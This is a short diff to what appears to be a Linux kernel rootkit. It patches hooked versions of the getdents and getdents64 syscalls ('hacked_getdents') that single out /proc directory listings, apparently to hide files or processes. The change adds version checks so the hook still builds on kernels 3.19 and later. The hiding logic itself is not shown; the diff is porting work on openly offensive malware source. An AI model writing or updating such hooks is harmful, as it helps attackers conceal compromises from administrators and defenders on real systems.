@@ -90,8 +90,11 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	if (err)
 		goto out;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-
+#else
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
 		proc = 1;
@@ -141,7 +144,11 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	if (err)
 		goto out;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+#else
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+#endif
 
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
 		/*&& MINOR(d_inode->i_rdev) == 1*/)
